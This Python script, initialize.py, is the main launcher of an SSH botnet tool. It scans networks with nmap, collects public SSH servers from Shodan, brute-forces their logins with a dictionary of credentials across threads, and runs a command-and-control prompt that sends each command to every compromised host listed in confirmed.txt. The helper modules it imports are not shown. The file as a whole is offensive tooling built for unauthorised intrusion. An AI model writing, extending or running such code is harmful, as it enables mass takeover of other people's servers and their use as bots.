#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Main program using argparse to handle execution of selected programs.
Name: initialize.py
Author: PiningNorwegianBlue
Date: August 5th, 2019
"""

import argparse
import threading
import time
import collection


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-s", "--scan",
                        help="Scan for SSH servers locally. <-s> <IP-1>,<IP-2>")
    parser.add_argument("-S", "--shodan",
                        required=False,
                        default=False,
                        action="store_true",
                        help="Collect known SSH servers from Shodan.io")
    parser.add_argument("-b", "--brute",
                        required=False,
                        default=False,
                        action="store_true",
                        help="Perform dictionary attack on known hosts")
    parser.add_argument("-c", "--control",
                        required=False,
                        default=False,
                        action="store_true",
                        help="Use verified credentials and hosts to start the Command and Control central")
    parser.add_argument("-v", "--verbose",
                        required=False,
                        default=False,
                        action="store_true",
                        help="Print results from selected actions")
    args = parser.parse_args()

#  Scanner using NMAP
    if args.scan:
        st = time.time()
        print("Scanning targets")
        target_list = []
        for t in str(args.scan).split(","):
            target_list.append(t)
        for a in target_list:
            s = collection.Scan(a, args.verbose)
            s._scan()
        print("Time spent: ", time.time() - st)

#  Collecting IP addresses using www.shodan.io
    if args.shodan:
        print("Gathering public IP addresses running SSH from www.shodan.io")
        collection.shodan_gather(args.verbose)

#  Bruteforce SSH credentials
    if args.brute:
        st = time.time()
        import bruteForce
        host_path = "./hosts.txt"
        creds_path = "./creds.txt"
        operations = {}

        def force():
            for i in operations.keys():
                if threading.Thread(target=bruteForce.login_ssh, args=(i, operations[i][:])).start():
                    time.sleep(0.01)

        def queue_make():
            with open(host_path, "r+") as hosts:
                for host in hosts:
                    host = host.strip("\n")
                    op = {host: []}
                    with open(creds_path, "r+") as c:
                        c.seek(0)
                        for cred in c.readlines():
                            op[host].append(cred.strip("\n"))
                            operations.update(op)
            force()
        queue_make()
        print("Time spent: ", time.time() - st)

#  Command and Control central using confirmed.txt for address and credentials
    if args.control:
        confirmed_creds = []

        def initiate_bots():
            # Creates a list of confirmed IP:USERNAME:PASSWORD from confirmed.txt
            try:
                with open("confirmed.txt", "r") as creds:
                    for target_creds in creds.readlines():  # Assuming one host:user:password per line
                        confirmed_creds.append(target_creds)
            except FileNotFoundError as e:
                print("No creds.txt found. Please execute the dictionary attack module then try again.")
                print(e)
        initiate_bots()
        # Keeps issuing commands until the exit command is issued or an error is thrown
        command = input(">>> ")
        while command.lower() != "exit":
            for c in confirmed_creds:
                host = c.split(":")[0]
                user = c.split(":")[1]
                password = c.split(":")[2]
                target = collection.Bot(host, user, password)
                print(str(target.send_command(command)))
            command = input(">>> ")


if __name__ == "__main__":
    main()
